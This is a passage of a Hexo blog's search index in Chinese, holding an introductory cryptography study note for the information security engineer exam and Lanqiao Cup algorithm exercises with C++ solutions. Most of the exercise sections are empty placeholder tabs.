<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>信息安全工程师复习</title>
      <link href="2020/09/27/Class/InformationSecurityEngineer/"/>
      <url>2020/09/27/Class/InformationSecurityEngineer/</url>
      
        <content type="html"><![CDATA[<h1 id="密码学基础与应用"><a href="#密码学基础与应用" class="headerlink" title="密码学基础与应用"></a>密码学基础与应用</h1><p>&emsp;&emsp;研究密码编码的科学称为<strong>密码编制学(Cryptography)**，研究密码破译的科学称为</strong>密码分析学(Cryptanalysis)<strong>,密码编制学与密码分析学共同组成</strong>密码学(Cryptology)**</p><p>&emsp;&emsp;密码学作为信息安全的关键技术，其安全目标主要包括三个非常重要的方面，<strong>保密性(Confidentiality)**、</strong>完整性(Integrity)<strong>和</strong>可用性(Availability)**。</p><p>&emsp;&emsp;保密性是确保信息仅被合法用户访问,而不被泄露给非授权的用户、实体或过程，或供其利用的特性。</p><ul><li>常用的保密技术包括：<ul><li>防侦收</li><li>防辐射</li><li>数据加密</li><li>物理保密</li></ul></li></ul><p>&emsp;&emsp;完整性是指所有资源只能由授权方或以授权的方式进行修改，即信息未经授权不能进行改变的特征。</p><p>&emsp;&emsp;可用性是指所有资源在适当的时候可以由授权方访问，即信息科被授权实体访问并按需求使用的特性。可用性还应满足身份识别与确认、访问控制。</p><p>&emsp;&emsp;密码技术的基本思想是伪装信息，使未授权者不能理解他的真实含义。伪装前的原始数据称为<strong>明文(Plaintext)**，伪装后的数据称为</strong>密文(Ciphertext)<strong>,伪装的过程称为</strong>加密(Encryption)<strong>。加密在</strong>加密密钥(Key)<strong>的控制下进行。用于对数据加密的一组数学变换称为加密算法。发信者将明文数据加密成密文，然后将密文数据送入到网络传输或存入计算机文件，而且只给合法收信者分配密钥。合法收信者接收到密文后，施行与加密变换相逆的变换，去掉密文的伪装恢复出明文，这一过程称为</strong>解密(Decryption)<strong>。解密在</strong>解密密钥<strong>的控制下进行。用于解密的一组数学变换称为</strong>解密算法**，而且解密算法是加密算法的逆。</p><ul><li>&emsp;一个密码系统，通常简称为**密码体制(Cryptosystem)**，由五部分组成<ol><li><strong>明文空间 M</strong>，他是全体明文的集合</li><li><strong>密文空间 C</strong>，他是全体密文的集合</li><li><strong>密钥空间 K</strong>，他是全体密钥的集合。其中每一个密钥K均由加密密钥和解密密钥组成</li><li><strong>加密算法 E</strong>，它是一组由M到C的加密变换</li><li><strong>解密算法 D</strong>，它是一组由C到M的解密变换</li></ol></li></ul><p>&emsp;&emsp;对于每一个确定的密钥，加密算法将确定的一个具体的加密变换，解密算法将确定一个具体的解密变换，而且解密变换就是加密变换的逆变换。对于明文空间 M 中的每一个明文 M ，加密算法 E 在加密密钥 K 的控制下将明文 M 加密成密文 C。而解密算法 D 在解密密钥 K 的控制下将密文 C 解密出同一明文 M</p><p>&emsp;&emsp;如果一个密码体制的<strong>加密密钥</strong>等于<strong>解密密钥</strong>，或者由其中一个很容易推出另一个，则称为<strong>单密钥密码体制</strong>或对<strong>称密码体制</strong>或<strong>传统密码体制</strong>。否则称为<strong>双密钥密码体制</strong>。</p>]]></content>
      
      
      <categories>
          
          <category> 课程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蓝桥杯 算法训练（1）</title>
      <link href="2020/09/27/Programme/lanqiaobei/Algorithm-Training/Algorithm-Training/"/>
      <url>2020/09/27/Programme/lanqiaobei/Algorithm-Training/Algorithm-Training/</url>
      
        <content type="html"><![CDATA[<div class="note info simple"><p>前30道题</p></div><h1 id="ALGO-1-区间k大数查询"><a href="#ALGO-1-区间k大数查询" class="headerlink" title="ALGO-1    区间k大数查询"></a>ALGO-1    区间k大数查询</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><ol><li><p>资源限制<br> 时间限制：1.0s   内存限制：256.0MB</p></li><li><p>问题描述<br> 给定一个序列，每次询问序列中第l个数到第r个数中第K大的数是哪个。</p></li><li><p>输入格式<br> 第一行包含一个数n，表示序列长度。<br> 第二行包含n个正整数，表示给定的序列。<br> 第三个包含一个正整数m，表示询问个数。<br> 接下来m行，每行三个数l,r,K，表示询问序列从左往右第l个数到第r个数中，从大往小第K大的数是哪个。序列元素从1开始标号。</p></li><li><p>输出格式<br> 总共输出m行，每行一个数，表示询问的答案。</p></li><li><p>样例输入<br> 5<br> 1 2 3 4 5<br> 2<br> 1 5 2<br> 2 3 2</p></li><li><p>样例输出<br> 4<br> 2</p></li><li><p>数据规模与约定<br> 对于30%的数据，n,m&lt;=100；<br> 对于100%的数据，n,m&lt;=1000；<br> 保证k&lt;=(r-l+1)，序列中的数&lt;=106。</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> arr[<span class="number">1010</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> lenth;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; lenth;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= lenth; i++)</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; arr[i];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; num;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (num--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> start, end, no, brr[<span class="number">1010</span>];</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; start &gt;&gt; end &gt;&gt; no;</span><br><span class="line">        <span class="keyword">if</span> (start &lt;= end)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = start; i &lt;= end; i++)</span><br><span class="line">                brr[i] = arr[i];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = start; i &lt;= end<span class="number">-1</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = start; j &lt;= end<span class="number">-1</span>; j++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(brr[j]&lt;brr[j+<span class="number">1</span>])</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">int</span> temp = brr[j];</span><br><span class="line">                        brr[j]=brr[j+<span class="number">1</span>];</span><br><span class="line">                        brr[j+<span class="number">1</span>]=temp;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; brr[start+no<span class="number">-1</span>] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="ALGO-2-最大最小公倍数"><a href="#ALGO-2-最大最小公倍数" class="headerlink" title="ALGO-2    最大最小公倍数"></a>ALGO-2    最大最小公倍数</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><ol><li><p>资源限制<br> 时间限制：1.0s   内存限制：256.0MB</p></li><li><p>问题描述<br> 已知一个正整数N，问从1~N中任选出三个数，他们的最小公倍数最大可以为多少。</p></li><li><p>输入格式<br> 输入一个正整数N。</p></li><li><p>输出格式<br> 输出一个整数，表示你找到的最小公倍数。</p></li><li><p>样例输入<br> 9</p></li><li><p>样例输出<br> 504</p></li><li><p>数据规模与约定<br> 1 &lt;= N &lt;= 106。</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> num;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; num;</span><br><span class="line"><span class="keyword">if</span>(num%<span class="number">2</span>==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(num%<span class="number">3</span>==<span class="number">0</span>)</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; (num<span class="number">-1</span>)*(num<span class="number">-2</span>)*(num<span class="number">-3</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; num*(num<span class="number">-1</span>)*(num<span class="number">-3</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; num*(num<span class="number">-1</span>)*(num<span class="number">-2</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="ALGO-3-K好数"><a href="#ALGO-3-K好数" class="headerlink" title="ALGO-3    K好数"></a>ALGO-3    K好数</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><ol><li><p>资源限制<br> 时间限制：1.0s   内存限制：256.0MB</p></li><li><p>问题描述<br> 如果一个自然数N的K进制表示中任意的相邻的两位都不是相邻的数字，那么我们就说这个数是K好数。求L位K进制数中K好数的数目。例如K = 4，L = 2的时候，所有K好数为11、13、20、22、30、31、33 共7个。由于这个数目很大，请你输出它对1000000007取模后的值。</p></li><li><p>输入格式<br> 输入包含两个正整数，K和L。</p></li><li><p>输出格式<br> 输出一个整数，表示答案对1000000007取模后的值。</p></li><li><p>样例输入<br> 4 2</p></li><li><p>样例输出<br> 7</p></li><li><p>数据规模与约定<br> 对于30%的数据，KL &lt;= 106；<br> 对于50%的数据，K &lt;= 16， L &lt;= 10；<br> 对于100%的数据，1 &lt;= K,L &lt;= 100。</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="ALGO-4-结点选择"><a href="#ALGO-4-结点选择" class="headerlink" title="ALGO-4    结点选择"></a>ALGO-4    结点选择</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="ALGO-5-最短路"><a href="#ALGO-5-最短路" class="headerlink" title="ALGO-5    最短路"></a>ALGO-5    最短路</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="ALGO-6-安慰奶牛"><a href="#ALGO-6-安慰奶牛" class="headerlink" title="ALGO-6    安慰奶牛"></a>ALGO-6    安慰奶牛</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="ALGO-7-逆序对"><a href="#ALGO-7-逆序对" class="headerlink" title="ALGO-7    逆序对"></a>ALGO-7    逆序对</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="ALGO-8-操作格子"><a href="#ALGO-8-操作格子" class="headerlink" title="ALGO-8    操作格子"></a>ALGO-8    操作格子</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id=""><a href="#" class="headerlink" title=""></a></h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="-1"><a href="#-1" class="headerlink" title=""></a></h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="-2"><a href="#-2" class="headerlink" title=""></a></h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="-3"><a href="#-3" class="headerlink" title=""></a></h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="-4"><a href="#-4" class="headerlink" title=""></a></h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="-5"><a href="#-5" class="headerlink" title=""></a></h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="-6"><a href="#-6" class="headerlink" title=""></a></h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="-7"><a href="#-7" class="headerlink" title=""></a></h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="-8"><a href="#-8" class="headerlink" title=""></a></h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="-9"><a href="#-9" class="headerlink" title=""></a></h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="-10"><a href="#-10" class="headerlink" title=""></a></h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="-11"><a href="#-11" class="headerlink" title=""></a></h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="-12"><a href="#-12" class="headerlink" title=""></a></h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="-13"><a href="#-13" class="headerlink" title=""></a></h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="-14"><a href="#-14" class="headerlink" title=""></a></h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="-15"><a href="#-15" class="headerlink" title=""></a></h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="-16"><a href="#-16" class="headerlink" title=""></a></h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="-17"><a href="#-17" class="headerlink" title=""></a></h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="-18"><a href="#-18" class="headerlink" title=""></a></h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><button type="button" class="tab-to-top" aria-label="scroll to 